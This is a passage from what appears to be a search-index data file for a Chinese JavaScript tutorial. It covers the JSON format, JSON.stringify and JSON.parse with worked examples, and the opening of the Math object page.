\u65b9\u6cd5\uff0c\u56e0\u6b64\u8f6c\u6362\u6210 JSON \u683c\u5f0f\u65f6\uff0c\u6b63\u5219\u5bf9\u8c61\u5c31\u5148\u8c03\u7528 toJSON() \u65b9\u6cd5\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u88ab JSON.stringify() \u65b9\u6cd5\u5904\u7406\u3002 JSON.parse() \u00b6 JSON.parse() \u65b9\u6cd5\u7528\u4e8e\u5c06 JSON \u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5bf9\u5e94\u7684\u503c\u3002 1 2 3 4 5 6 7 8 JSON . parse ( '{}' ) // {} JSON . parse ( 'true' ) // true JSON . parse ( '\"foo\"' ) // \"foo\" JSON . parse ( '[1, 5, \"false\"]' ) // [1, 5, \"false\"] JSON . parse ( 'null' ) // null var o = JSON . parse ( '{\"name\": \"\u5f20\u4e09\"}' ); o . name // \u5f20\u4e09 \u5982\u679c\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u662f\u6709\u6548\u7684 JSON \u683c\u5f0f\uff0c JSON.parse() \u65b9\u6cd5\u5c06\u62a5\u9519\u3002 1 2 JSON . parse ( \"'String'\" ) // illegal single quotes // SyntaxError: Unexpected token ILLEGAL \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u4e2d\u662f\u4e00\u4e2a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u4e0d\u7b26\u5408 JSON \u683c\u5f0f\uff0c\u6240\u4ee5\u62a5\u9519\u3002 \u4e3a\u4e86\u5904\u7406\u89e3\u6790\u9519\u8bef\uff0c\u53ef\u4ee5\u5c06 JSON.parse() \u65b9\u6cd5\u653e\u5728 try...catch \u4ee3\u7801\u5757\u4e2d\u3002 1 2 3 4 5 try { JSON . parse ( \"'String'\" ); } catch ( e ) { console . log ( 'parsing error' ); } JSON.parse() \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5904\u7406\u51fd\u6570\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6cd5\u4e0e JSON.stringify() \u65b9\u6cd5\u7c7b\u4f3c\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( key === 'a' ) { return value + 10 ; } return value ; } JSON . parse ( '{\"a\": 1, \"b\": 2}' , f ) // {a: 11, b: 2} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.parse() \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5982\u679c\u952e\u540d\u662f a \uff0c\u8be5\u51fd\u6570\u4f1a\u5c06\u952e\u503c\u52a0\u4e0a10\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 MDN, Using native JSON MDN, JSON.parse Dr. Axel Rauschmayer, JavaScript\u2019s JSON API Jim Cowart, What You Might Not Know About JSON.stringify() Marco Rogers, What is JSON?","title":"JSON \u5bf9\u8c61"},{"location":"stdlib/json/#json","text":"","title":"JSON \u5bf9\u8c61"},{"location":"stdlib/json/#json_1","text":"JSON \u683c\u5f0f\uff08JavaScript Object Notation \u7684\u7f29\u5199\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u6570\u636e\u4ea4\u6362\u7684\u6587\u672c\u683c\u5f0f\uff0c2001\u5e74\u7531 Douglas Crockford \u63d0\u51fa\uff0c\u76ee\u7684\u662f\u53d6\u4ee3\u7e41\u7410\u7b28\u91cd\u7684 XML \u683c\u5f0f\u3002 \u76f8\u6bd4 XML \u683c\u5f0f\uff0cJSON \u683c\u5f0f\u6709\u4e24\u4e2a\u663e\u8457\u7684\u4f18\u70b9\uff1a\u4e66\u5199\u7b80\u5355\uff0c\u4e00\u76ee\u4e86\u7136\uff1b\u7b26\u5408 JavaScript \u539f\u751f\u8bed\u6cd5\uff0c\u53ef\u4ee5\u7531\u89e3\u91ca\u5f15\u64ce\u76f4\u63a5\u5904\u7406\uff0c\u4e0d\u7528\u53e6\u5916\u6dfb\u52a0\u89e3\u6790\u4ee3\u7801\u3002\u6240\u4ee5\uff0cJSON \u8fc5\u901f\u88ab\u63a5\u53d7\uff0c\u5df2\u7ecf\u6210\u4e3a\u5404\u5927\u7f51\u7ad9\u4ea4\u6362\u6570\u636e\u7684\u6807\u51c6\u683c\u5f0f\uff0c\u5e76\u88ab\u5199\u5165\u6807\u51c6\u3002 \u6bcf\u4e2a JSON \u5bf9\u8c61\u5c31\u662f\u4e00\u4e2a\u503c\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6570\u7ec4\u6216\u5bf9\u8c61\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\u3002\u603b\u4e4b\uff0c\u53ea\u80fd\u662f\u4e00\u4e2a\u503c\uff0c\u4e0d\u80fd\u662f\u4e24\u4e2a\u6216\u66f4\u591a\u7684\u503c\u3002 JSON \u5bf9\u503c\u7684\u7c7b\u578b\u548c\u683c\u5f0f\u6709\u4e25\u683c\u7684\u89c4\u5b9a\u3002 \u590d\u5408\u7c7b\u578b\u7684\u503c\u53ea\u80fd\u662f\u6570\u7ec4\u6216\u5bf9\u8c61\uff0c\u4e0d\u80fd\u662f\u51fd\u6570\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\u3001\u65e5\u671f\u5bf9\u8c61\u3002 \u539f\u59cb\u7c7b\u578b\u7684\u503c\u53ea\u6709\u56db\u79cd\uff1a\u5b57\u7b26\u4e32\u3001\u6570\u503c\uff08\u5fc5\u987b\u4ee5\u5341\u8fdb\u5236\u8868\u793a\uff09\u3001\u5e03\u5c14\u503c\u548c null \uff08\u4e0d\u80fd\u4f7f\u7528 NaN , Infinity , -Infinity \u548c undefined \uff09\u3002 \u5b57\u7b26\u4e32\u5fc5\u987b\u4f7f\u7528\u53cc\u5f15\u53f7\u8868\u793a\uff0c\u4e0d\u80fd\u4f7f\u7528\u5355\u5f15\u53f7\u3002 \u5bf9\u8c61\u7684\u952e\u540d\u5fc5\u987b\u653e\u5728\u53cc\u5f15\u53f7\u91cc\u9762\u3002 \u6570\u7ec4\u6216\u5bf9\u8c61\u6700\u540e\u4e00\u4e2a\u6210\u5458\u7684\u540e\u9762\uff0c\u4e0d\u80fd\u52a0\u9017\u53f7\u3002 \u4ee5\u4e0b\u90fd\u662f\u5408\u6cd5\u7684 JSON\u3002 1 2 3 4 5 6 7 [ \"one\" , \"two\" , \"three\" ] { \"one\" : 1 , \"two\" : 2 , \"three\" : 3 } { \"names\" : [ \"\u5f20\u4e09\" , \"\u674e\u56db\" ] } [ { \"name\" : \"\u5f20\u4e09\" }, { \"name\" : \"\u674e\u56db\" } ] \u4ee5\u4e0b\u90fd\u662f\u4e0d\u5408\u6cd5\u7684 JSON\u3002 1 2 3 4 5 6 7 8 9 10 11 12 { name : \"\u5f20\u4e09\" , 'age' : 32 } // \u5c5e\u6027\u540d\u5fc5\u987b\u4f7f\u7528\u53cc\u5f15\u53f7 [ 32 , 64 , 128 , 0xFFF ] // \u4e0d\u80fd\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u503c { \"name\" : \"\u5f20\u4e09\" , \"age\" : undefined } // \u4e0d\u80fd\u4f7f\u7528 undefined { \"name\" : \"\u5f20\u4e09\" , \"birthday\" : new Date ( 'Fri, 26 Aug 2011 07:13:10 GMT' ), \"getName\" : function () { return this . name ; } } // \u5c5e\u6027\u503c\u4e0d\u80fd\u4f7f\u7528\u51fd\u6570\u548c\u65e5\u671f\u5bf9\u8c61 \u6ce8\u610f\uff0c null \u3001\u7a7a\u6570\u7ec4\u548c\u7a7a\u5bf9\u8c61\u90fd\u662f\u5408\u6cd5\u7684 JSON \u503c\u3002","title":"JSON \u683c\u5f0f"},{"location":"stdlib/json/#json_2","text":"JSON \u5bf9\u8c61\u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u7528\u6765\u5904\u7406 JSON \u683c\u5f0f\u6570\u636e\u3002\u5b83\u6709\u4e24\u4e2a\u9759\u6001\u65b9\u6cd5\uff1a JSON.stringify() \u548c JSON.parse() \u3002","title":"JSON \u5bf9\u8c61"},{"location":"stdlib/json/#jsonstringify","text":"","title":"JSON.stringify()"},{"location":"stdlib/json/#_1","text":"JSON.stringify() \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a JSON \u5b57\u7b26\u4e32\u3002\u8be5\u5b57\u7b26\u4e32\u7b26\u5408 JSON \u683c\u5f0f\uff0c\u5e76\u4e14\u53ef\u4ee5\u88ab JSON.parse() \u65b9\u6cd5\u8fd8\u539f\u3002 1 2 3 4 5 6 7 8 9 10 11 JSON . stringify ( 'abc' ) // \"\"abc\"\" JSON . stringify ( 1 ) // \"1\" JSON . stringify ( false ) // \"false\" JSON . stringify ([]) // \"[]\" JSON . stringify ({}) // \"{}\" JSON . stringify ([ 1 , \"false\" , false ]) // '[1,\"false\",false]' JSON . stringify ({ name : \"\u5f20\u4e09\" }) // '{\"name\":\"\u5f20\u4e09\"}' \u4e0a\u9762\u4ee3\u7801\u5c06\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u6210 JSON \u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e\u539f\u59cb\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\uff0c\u8f6c\u6362\u7ed3\u679c\u4f1a\u5e26\u53cc\u5f15\u53f7\u3002 1 2 JSON . stringify ( 'foo' ) === \"foo\" // false JSON . stringify ( 'foo' ) === \"\\\"foo\\\"\" // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 foo \uff0c\u88ab\u8f6c\u6210\u4e86 \"\\\"foo\\\"\" \u3002\u8fd9\u662f\u56e0\u4e3a\u5c06\u6765\u8fd8\u539f\u7684\u65f6\u5019\uff0c\u5185\u5c42\u53cc\u5f15\u53f7\u53ef\u4ee5\u8ba9 JavaScript \u5f15\u64ce\u77e5\u9053\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u4e0d\u662f\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002 1 2 JSON . stringify ( false ) // \"false\" JSON . stringify ( 'false' ) // \"\\\"false\\\"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u5185\u5c42\u7684\u53cc\u5f15\u53f7\uff0c\u5c06\u6765\u8fd8\u539f\u7684\u65f6\u5019\uff0c\u5f15\u64ce\u5c31\u65e0\u6cd5\u77e5\u9053\u539f\u59cb\u503c\u662f\u5e03\u5c14\u503c\u8fd8\u662f\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u5bf9\u8c61\u7684\u5c5e\u6027\u662f undefined \u3001\u51fd\u6570\u6216 XML \u5bf9\u8c61\uff0c\u8be5\u5c5e\u6027\u4f1a\u88ab JSON.stringify() \u8fc7\u6ee4\u3002 1 2 3 4 5 6 var obj = { a : undefined , b : function () {} }; JSON . stringify ( obj ) // \"{}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 a \u5c5e\u6027\u662f undefined \uff0c\u800c b \u5c5e\u6027\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7ed3\u679c\u90fd\u88ab JSON.stringify \u8fc7\u6ee4\u3002 \u5982\u679c\u6570\u7ec4\u7684\u6210\u5458\u662f undefined \u3001\u51fd\u6570\u6216 XML \u5bf9\u8c61\uff0c\u5219\u8fd9\u4e9b\u503c\u88ab\u8f6c\u6210 null \u3002 1 2 var arr = [ undefined , function () {}]; JSON . stringify ( arr ) // \"[null,null]\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u7684\u6210\u5458\u662f undefined \u548c\u51fd\u6570\uff0c\u5b83\u4eec\u90fd\u88ab\u8f6c\u6210\u4e86 null \u3002 \u6b63\u5219\u5bf9\u8c61\u4f1a\u88ab\u8f6c\u6210\u7a7a\u5bf9\u8c61\u3002 1 JSON . stringify ( /foo/ ) // \"{}\" JSON.stringify() \u65b9\u6cd5\u4f1a\u5ffd\u7565\u5bf9\u8c61\u7684\u4e0d\u53ef\u904d\u5386\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var obj = {}; Object . defineProperties ( obj , { 'foo' : { value : 1 , enumerable : true }, 'bar' : { value : 2 , enumerable : false } }); JSON . stringify ( obj ); // \"{\"foo\":1}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c bar \u662f obj \u5bf9\u8c61\u7684\u4e0d\u53ef\u904d\u5386\u5c5e\u6027\uff0c JSON.stringify \u65b9\u6cd5\u4f1a\u5ffd\u7565\u8fd9\u4e2a\u5c5e\u6027\u3002","title":"\u57fa\u672c\u7528\u6cd5"},{"location":"stdlib/json/#_2","text":"JSON.stringify() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6570\u7ec4\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6307\u5b9a\u53c2\u6570\u5bf9\u8c61\u7684\u54ea\u4e9b\u5c5e\u6027\u9700\u8981\u8f6c\u6210\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 var obj = { 'prop1' : 'value1' , 'prop2' : 'value2' , 'prop3' : 'value3' }; var selectedProperties = [ 'prop1' , 'prop2' ]; JSON . stringify ( obj , selectedProperties ) // \"{\"prop1\":\"value1\",\"prop2\":\"value2\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\uff0c\u53ea\u8f6c prop1 \u548c prop2 \u4e24\u4e2a\u5c5e\u6027\u3002 \u8fd9\u4e2a\u7c7b\u4f3c\u767d\u540d\u5355\u7684\u6570\u7ec4\uff0c\u53ea\u5bf9\u5bf9\u8c61\u7684\u5c5e\u6027\u6709\u6548\uff0c\u5bf9\u6570\u7ec4\u65e0\u6548\u3002 1 2 3 4 5 JSON . stringify ([ 'a' , 'b' ], [ '0' ]) // \"[\"a\",\"b\"]\" JSON . stringify ({ 0 : 'a' , 1 : 'b' }, [ '0' ]) // \"{\"0\":\"a\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a JSON \u683c\u5f0f\u53ea\u8f6c 0 \u53f7\u5c5e\u6027\uff0c\u5b9e\u9645\u4e0a\u5bf9\u6570\u7ec4\u662f\u65e0\u6548\u7684\uff0c\u53ea\u5bf9\u5bf9\u8c61\u6709\u6548\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fd8\u53ef\u4ee5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u66f4\u6539 JSON.stringify() \u7684\u8fd4\u56de\u503c\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( typeof value === \"number\" ) { value = 2 * value ; } return value ; } JSON . stringify ({ a : 1 , b : 2 }, f ) // '{\"a\": 2,\"b\": 4}' \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684 f \u51fd\u6570\uff0c\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u88ab\u8f6c\u6362\u7684\u5bf9\u8c61\u7684\u952e\u540d\u548c\u952e\u503c\u3002\u5982\u679c\u952e\u503c\u662f\u6570\u503c\uff0c\u5c31\u5c06\u5b83\u4e58\u4ee5 2 \uff0c\u5426\u5219\u5c31\u539f\u6837\u8fd4\u56de\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5904\u7406\u51fd\u6570\u662f\u9012\u5f52\u5904\u7406\u6240\u6709\u7684\u952e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { a : { b : 1 }}; function f ( key , value ) { console . log ( \"[\" + key + \"]:\" + value ); return value ; } JSON . stringify ( obj , f ) // []:[object Object] // [a]:[object Object] // [b]:1 // '{\"a\":{\"b\":1}}' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u4e00\u5171\u4f1a\u88ab f \u51fd\u6570\u5904\u7406\u4e09\u6b21\uff0c\u8f93\u51fa\u7684\u6700\u540e\u90a3\u884c\u662f JSON.stringify() \u7684\u9ed8\u8ba4\u8f93\u51fa\u3002\u7b2c\u4e00\u6b21\u952e\u540d\u4e3a\u7a7a\uff0c\u952e\u503c\u662f\u6574\u4e2a\u5bf9\u8c61 obj \uff1b\u7b2c\u4e8c\u6b21\u952e\u540d\u4e3a a \uff0c\u952e\u503c\u662f {b: 1} \uff1b\u7b2c\u4e09\u6b21\u952e\u540d\u4e3a b \uff0c\u952e\u503c\u4e3a1\u3002 \u9012\u5f52\u5904\u7406\u4e2d\uff0c\u6bcf\u4e00\u6b21\u5904\u7406\u7684\u5bf9\u8c61\uff0c\u90fd\u662f\u524d\u4e00\u6b21\u8fd4\u56de\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = { a : 1 }; function f ( key , value ) { if ( typeof value === 'object' ) { return { b : 2 }; } return value * 2 ; } JSON . stringify ( obj , f ) // \"{\"b\": 4}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f \u51fd\u6570\u4fee\u6539\u4e86\u5bf9\u8c61 obj \uff0c\u63a5\u7740 JSON.stringify() \u65b9\u6cd5\u5c31\u9012\u5f52\u5904\u7406\u4fee\u6539\u540e\u7684\u5bf9\u8c61 obj \u3002 \u5982\u679c\u5904\u7406\u51fd\u6570\u8fd4\u56de undefined \u6216\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u5219\u8be5\u5c5e\u6027\u4f1a\u88ab\u5ffd\u7565\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( typeof ( value ) === \"string\" ) { return undefined ; } return value ; } JSON . stringify ({ a : \"abc\" , b : 123 }, f ) // '{\"b\": 123}' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u5c5e\u6027\u7ecf\u8fc7\u5904\u7406\u540e\uff0c\u8fd4\u56de undefined \uff0c\u4e8e\u662f\u8be5\u5c5e\u6027\u88ab\u5ffd\u7565\u4e86\u3002","title":"\u7b2c\u4e8c\u4e2a\u53c2\u6570"},{"location":"stdlib/json/#_3","text":"JSON.stringify() \u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u7528\u4e8e\u589e\u52a0\u8fd4\u56de\u7684 JSON \u5b57\u7b26\u4e32\u7684\u53ef\u8bfb\u6027\u3002 \u9ed8\u8ba4\u8fd4\u56de\u7684\u662f\u5355\u884c\u5b57\u7b26\u4e32\uff0c\u5bf9\u4e8e\u5927\u578b\u7684 JSON \u5bf9\u8c61\uff0c\u53ef\u8bfb\u6027\u975e\u5e38\u5dee\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570\u4f7f\u5f97\u6bcf\u4e2a\u5c5e\u6027\u5355\u72ec\u5360\u636e\u4e00\u884c\uff0c\u5e76\u4e14\u5c06\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u6307\u5b9a\u7684\u524d\u7f00\uff08\u4e0d\u8d85\u8fc710\u4e2a\u5b57\u7b26\uff09\u3002 1 2 3 4 5 6 7 8 9 10 // \u9ed8\u8ba4\u8f93\u51fa JSON . stringify ({ p1 : 1 , p2 : 2 }) // JSON.stringify({ p1: 1, p2: 2 }) // \u5206\u884c\u8f93\u51fa JSON . stringify ({ p1 : 1 , p2 : 2 }, null , '\\t' ) // { // \"p1\": 1, // \"p2\": 2 // } \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u7b2c\u4e09\u4e2a\u5c5e\u6027 \\t \u5728\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u7136\u540e\u5206\u884c\u663e\u793a\u3002 \u7b2c\u4e09\u4e2a\u5c5e\u6027\u5982\u679c\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u5219\u8868\u793a\u6bcf\u4e2a\u5c5e\u6027\u524d\u9762\u6dfb\u52a0\u7684\u7a7a\u683c\uff08\u6700\u591a\u4e0d\u8d85\u8fc710\u4e2a\uff09\u3002 1 2 3 4 5 6 7 JSON . stringify ({ p1 : 1 , p2 : 2 }, null , 2 ); /* \"{ \"p1\": 1, \"p2\": 2 }\" */","title":"\u7b2c\u4e09\u4e2a\u53c2\u6570"},{"location":"stdlib/json/#tojson","text":"\u5982\u679c\u53c2\u6570\u5bf9\u8c61\u6709\u81ea\u5b9a\u4e49\u7684 toJSON() \u65b9\u6cd5\uff0c\u90a3\u4e48 JSON.stringify() \u4f1a\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u5ffd\u7565\u539f\u5bf9\u8c61\u7684\u5176\u4ed6\u5c5e\u6027\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 8 9 10 11 var user = { firstName : '\u4e09' , lastName : '\u5f20' , get fullName (){ return this . lastName + this . firstName ; } }; JSON . stringify ( user ) // \"{\"firstName\":\"\u4e09\",\"lastName\":\"\u5f20\",\"fullName\":\"\u5f20\u4e09\"}\" \u73b0\u5728\uff0c\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u52a0\u4e0a toJSON() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var user = { firstName : '\u4e09' , lastName : '\u5f20' , get fullName (){ return this . lastName + this . firstName ; }, toJSON : function () { return { name : this . lastName + this . firstName }; } }; JSON . stringify ( user ) // \"{\"name\":\"\u5f20\u4e09\"}\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u53d1\u73b0\u53c2\u6570\u5bf9\u8c61\u6709 toJSON() \u65b9\u6cd5\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u5ffd\u7565\u539f\u5bf9\u8c61\u7684\u5176\u4ed6\u53c2\u6570\u3002 Date \u5bf9\u8c61\u5c31\u6709\u4e00\u4e2a\u81ea\u5df1\u7684 toJSON() \u65b9\u6cd5\u3002 1 2 3 var date = new Date ( '2015-01-01' ); date . toJSON () // \"2015-01-01T00:00:00.000Z\" JSON . stringify ( date ) // \"\"2015-01-01T00:00:00.000Z\"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.stringify() \u53d1\u73b0\u5904\u7406\u7684\u662f Date \u5bf9\u8c61\u5b9e\u4f8b\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7684 toJSON() \u65b9\u6cd5\uff0c\u5c06\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4f5c\u4e3a\u53c2\u6570\u3002 toJSON() \u65b9\u6cd5\u7684\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u5c06\u6b63\u5219\u5bf9\u8c61\u81ea\u52a8\u8f6c\u4e3a\u5b57\u7b26\u4e32\u3002\u56e0\u4e3a JSON.stringify() \u9ed8\u8ba4\u4e0d\u80fd\u8f6c\u6362\u6b63\u5219\u5bf9\u8c61\uff0c\u4f46\u662f\u8bbe\u7f6e\u4e86 toJSON() \u65b9\u6cd5\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f6c\u6362\u6b63\u5219\u5bf9\u8c61\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 var obj = { reg : /foo/ }; // \u4e0d\u8bbe\u7f6e toJSON \u65b9\u6cd5\u65f6 JSON . stringify ( obj ) // \"{\"reg\":{}}\" // \u8bbe\u7f6e toJSON \u65b9\u6cd5\u65f6 RegExp . prototype . toJSON = RegExp . prototype . toString ; JSON . stringify ( /foo/ ) // \"\"/foo/\"\" \u4e0a\u9762\u4ee3\u7801\u5728\u6b63\u5219\u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u9762\u90e8\u7f72\u4e86 toJSON() \u65b9\u6cd5\uff0c\u5c06\u5176\u6307\u5411 toString() \u65b9\u6cd5\uff0c\u56e0\u6b64\u8f6c\u6362\u6210 JSON \u683c\u5f0f\u65f6\uff0c\u6b63\u5219\u5bf9\u8c61\u5c31\u5148\u8c03\u7528 toJSON() \u65b9\u6cd5\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u88ab JSON.stringify() \u65b9\u6cd5\u5904\u7406\u3002","title":"\u53c2\u6570\u5bf9\u8c61\u7684 toJSON() \u65b9\u6cd5"},{"location":"stdlib/json/#jsonparse","text":"JSON.parse() \u65b9\u6cd5\u7528\u4e8e\u5c06 JSON \u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5bf9\u5e94\u7684\u503c\u3002 1 2 3 4 5 6 7 8 JSON . parse ( '{}' ) // {} JSON . parse ( 'true' ) // true JSON . parse ( '\"foo\"' ) // \"foo\" JSON . parse ( '[1, 5, \"false\"]' ) // [1, 5, \"false\"] JSON . parse ( 'null' ) // null var o = JSON . parse ( '{\"name\": \"\u5f20\u4e09\"}' ); o . name // \u5f20\u4e09 \u5982\u679c\u4f20\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u662f\u6709\u6548\u7684 JSON \u683c\u5f0f\uff0c JSON.parse() \u65b9\u6cd5\u5c06\u62a5\u9519\u3002 1 2 JSON . parse ( \"'String'\" ) // illegal single quotes // SyntaxError: Unexpected token ILLEGAL \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u4e2d\u662f\u4e00\u4e2a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\uff0c\u56e0\u4e3a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u4e0d\u7b26\u5408 JSON \u683c\u5f0f\uff0c\u6240\u4ee5\u62a5\u9519\u3002 \u4e3a\u4e86\u5904\u7406\u89e3\u6790\u9519\u8bef\uff0c\u53ef\u4ee5\u5c06 JSON.parse() \u65b9\u6cd5\u653e\u5728 try...catch \u4ee3\u7801\u5757\u4e2d\u3002 1 2 3 4 5 try { JSON . parse ( \"'String'\" ); } catch ( e ) { console . log ( 'parsing error' ); } JSON.parse() \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5904\u7406\u51fd\u6570\uff0c\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6cd5\u4e0e JSON.stringify() \u65b9\u6cd5\u7c7b\u4f3c\u3002 1 2 3 4 5 6 7 8 9 function f ( key , value ) { if ( key === 'a' ) { return value + 10 ; } return value ; } JSON . parse ( '{\"a\": 1, \"b\": 2}' , f ) // {a: 11, b: 2} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c JSON.parse() \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5982\u679c\u952e\u540d\u662f a \uff0c\u8be5\u51fd\u6570\u4f1a\u5c06\u952e\u503c\u52a0\u4e0a10\u3002","title":"JSON.parse()"},{"location":"stdlib/json/#_4","text":"MDN, Using native JSON MDN, JSON.parse Dr. Axel Rauschmayer, JavaScript\u2019s JSON API Jim Cowart, What You Might Not Know About JSON.stringify() Marco Rogers, What is JSON?","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"stdlib/math/","text":"Math \u5bf9\u8c61 \u00b6 Math \u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u63d0\u4f9b\u5404\u79cd\u6570\u5b66\u529f\u80fd\u3002\u8be5\u5bf9\u8c61\u4e0d\u662f\u6784\u9020\u51fd\u6570\uff0c\u4e0d\u80fd\u751f\u6210\u5b9e\u4f8b\uff0c\u6240\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u90fd\u5fc5\u987b\u5728 Math \u5bf9\u8c61\u4e0a\u8c03\u7528\u3002 \u9759\u6001\u5c5e\u6027 \u00b6 Math \u5bf9\u8c61\u7684\u9759\u6001\u5c5e\u6027\uff0c\u63d0\u4f9b\u4ee5\u4e0b\u4e00\u4e9b\u6570\u5b66\u5e38\u6570\u3002 Math.E \uff1a\u5e38\u6570 e \u3002 Math.LN2 \uff1a2 \u7684\u81ea\u7136\u5bf9\u6570\u3002 Math.LN10 \uff1a10 \u7684\u81ea\u7136\u5bf9\u6570\u3002 Math.LOG2E \uff1a\u4ee5 2 \u4e3a\u5e95\u7684 e \u7684\u5bf9\u6570\u3002 Math.LOG10E \uff1a\u4ee5 10 \u4e3a\u5e95\u7684 e \u7684\u5bf9\u6570\u3002 Math.PI \uff1a\u5e38\u6570 \u03c0 \u3002 Math.SQRT1_2 \uff1a0.5 \u7684\u5e73\u65b9\u6839\u3002 Math.SQRT2 \uff1a2 \u7684\u5e73\u65b9\u6839\u3002 1 2 3 4 5 6 7 8 Math . E // 2.718281828459045 Math . LN2 // 0.6931471805599453 Math . LN10 // 2.302585092994046 